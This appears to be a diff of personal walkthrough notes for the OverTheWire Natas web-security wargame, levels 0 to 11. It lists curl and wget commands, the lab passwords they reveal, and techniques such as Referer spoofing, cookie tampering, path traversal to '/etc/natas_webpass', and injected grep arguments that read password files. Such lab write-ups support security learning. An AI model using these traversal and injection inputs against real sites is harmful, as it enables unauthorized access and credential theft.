@@ -1,2 +1,55 @@
-https://overthewire.org/wargames/natas/
+curl --user natas0:natas0 http://natas0.natas.labs.overthewire.org
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+curl --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+
+curl --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org
+http://natas2.natas.labs.overthewire.org/files/users.txt
+
+wget --user natas2 --password ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+curl --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org
+
+curl --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
+wget --user natas3 --password sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org
+
+curl --referer 'http://natas5.natas.labs.overthewire.org/' --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+curl --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
+
+curl --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie-jar cookies.txt http://natas5.natas.labs.overthewire.org
+replace 0 to 1 in loggedin param
+curl --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -b cookies.txt http://natas5.natas.labs.overthewire.org
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+
+curl --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org
+
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+view-source:http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+reverse engineer function encodeSecret() - natas8.php
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+-P '\S+' /etc/natas_webpass/natas10 &
+
+Output:
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+-P '\S+' /etc/natas_webpass/natas11
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+
+
+
+
+
 
